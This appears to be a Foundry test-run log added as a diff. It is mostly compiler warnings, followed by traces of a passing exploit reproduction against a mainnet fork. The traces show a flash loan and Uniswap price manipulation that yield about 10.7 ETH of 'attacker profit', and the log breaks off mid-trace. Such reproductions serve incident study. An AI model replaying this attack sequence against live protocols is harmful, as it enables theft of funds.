@@ -1,0 +1,1342 @@
+Compiling 23 files with Solc 0.8.35
+Solc 0.8.35 finished in 364.34ms
+Compiler run successful with warnings:
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+  --> basetest.sol:87:5:
+   |
+87 |     modifier balanceLog() virtual {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+   --> basetest.sol:103:5:
+    |
+103 |     modifier balanceLog2(address target) virtual {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/FloatProtocol_exp.sol:FloatProtocol_exp
+[PASS] testExploit() (gas: 3355110)
+Logs:
+  Attacker Before exploit ETH Balance: 0.000000000000000000
+  attacker ETH profit: 10.706591043820923462
+  Attacker After exploit ETH Balance: 10.706591043820923462
+
+Traces:
+  [30926] FloatProtocol_exp::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 25874401 [2.587e7])
+    │   └─ ← [Return] 1
+    ├─ [0] VM::label(AttackerEOA: [0xAEA29218262dc6b0904Ca077f6527C49dfd426D9], "AttackerEOA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C], "HypervisorA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], "HypervisorB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], "UniV3Pool")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [3715510] FloatProtocol_exp::testExploit()
+    ├─ [0] VM::deal(AttackerEOA: [0xAEA29218262dc6b0904Ca077f6527C49dfd426D9], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit ETH Balance", val: 0, decimals: 18)
+    ├─ [0] VM::prank(AttackerEOA: [0xAEA29218262dc6b0904Ca077f6527C49dfd426D9], AttackerEOA: [0xAEA29218262dc6b0904Ca077f6527C49dfd426D9])
+    │   └─ ← [Return]
+    ├─ [1719217] → new FloatHypervisorAttack@0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab
+    │   ├─ [31784] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::approve(0x3803729416AA5207FE801C1C565B906F6f3f8a28, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ [24538] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::approve(0x3803729416AA5207FE801C1C565B906F6f3f8a28, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   ├─ emit Approval(owner: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], spender: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xd2a7dd510741a504147a01ed6e1711945381e597349bac81e11d0dc50ab19295: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [25284] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::approve(0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ [24538] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::approve(0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   ├─ emit Approval(owner: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], spender: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x7493fa38636fdf53bc6a25e0ed6dd59a309439f6929b684d878489663566a1f9: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [24420] WETH9::approve(0x3803729416AA5207FE801C1C565B906F6f3f8a28, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], spender: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x343fd7668e85a42c65b7e3ba40368320610740122e0b8f01a36977af6e6e0171: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [24420] WETH9::approve(0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], spender: 0x7CF8431E086e1bcdC9524fd305f7D5d8622CD75f, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x2672c964154788884f0730805a34407b6f95492d33505db26f234e60e8801a32: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [24420] WETH9::approve(Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], spender: Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xbb13cc4f63bde3b781f62947ba70df9e9da4319a7a4ffb19b370dbe075569285: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] 7891 bytes of code
+    ├─ [1934513] FloatHypervisorAttack::attack()
+    │   ├─ [1912893] Morpho::flashLoan(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 1000000000000000000000 [1e21], 0x)
+    │   │   ├─ emit FlashLoan(caller: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], token: WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], assets: 1000000000000000000000 [1e21])
+    │   │   ├─ [29962] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 1000000000000000000000 [1e21])
+    │   │   │   ├─ emit Transfer(from: Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 1000000000000000000000 [1e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   │   @ 0x9ddf8259b5dfabc9e47e107236a6121103d753bff80b7accad156017de069d9a: 0x000000000000000000000000000000000000000000000289d116f389f0258874 → 0x0000000000000000000000000000000000000000000002539b4d45c411858874
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1873309] FloatHypervisorAttack::onMorphoFlashLoan(1000000000000000000000 [1e21], 0x)
+    │   │   │   ├─ [1842286] UniswapV2Pair::swap(120000000000000000000000 [1.2e23], 0, FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x72756e)
+    │   │   │   │   ├─ [32949] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 120000000000000000000000 [1.2e23])
+    │   │   │   │   │   ├─ [32203] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 120000000000000000000000 [1.2e23]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x481DdaF90C59d91F3e480E6793122E62612CA5A9], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 120000000000000000000000 [1.2e23])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0 → 0x000000000000000000000000000000000000000000001969368974c05b000000
+    │   │   │   │   │   │   │   @ 0xc4b948fd41cc175e8979527a52bcb5d267fafc45ba8ecd9a74764598f775554d: 0x000000000000000000000000000000000000000000001c9904c94e15710e44cb → 0x00000000000000000000000000000000000000000000032fce3fd955160e44cb
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [1771339] FloatHypervisorAttack::uniswapV2Call(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 120000000000000000000000 [1.2e23], 0, 0x72756e)
+    │   │   │   │   │   ├─ [104516] UniV3Pool::swap(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], true, 114000000000000000000000 [1.14e23], 4295128740 [4.295e9], 0x)
+    │   │   │   │   │   │   ├─ [8062] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 12048651336097103662 [1.204e19])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 12048651336097103662 [1.204e19])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xe9e9ba455ec68cee0ae4017c153a91862b7360ef23874bd041366bd0dde96c36: 0x000000000000000000000000000000000000000000000001413fa6c0a9984fd0 → 0x0000000000000000000000000000000000000000000000009a0a3e32eafdd0a2
+    │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0x000000000000000000000000000000000000000000000036dcff16539d3a7f2e
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [3207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 253856175105035777502879 [2.538e23]
+    │   │   │   │   │   │   │   └─ ← [Return] 253856175105035777502879 [2.538e23]
+    │   │   │   │   │   │   ├─ [8793] FloatHypervisorAttack::uniswapV3SwapCallback(114000000000000000000000 [1.14e23], -12048651336097103662 [-1.204e19], 0x)
+    │   │   │   │   │   │   │   ├─ [7049] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], 114000000000000000000000 [1.14e23])
+    │   │   │   │   │   │   │   │   ├─ [6303] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], 114000000000000000000000 [1.14e23]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], amount: 114000000000000000000000 [1.14e23])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0xb65a6fcba7239a6c772fa71308ae3f27965827fb0aa7332845b0a66e1591e5d0: 0x0000000000000000000000000000000000000000000035c19221be5eea666e9f → 0x000000000000000000000000000000000000000000004de585f1207c0da66e9f
+    │   │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x000000000000000000000000000000000000000000001969368974c05b000000 → 0x00000000000000000000000000000000000000000000014542ba12a337c00000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
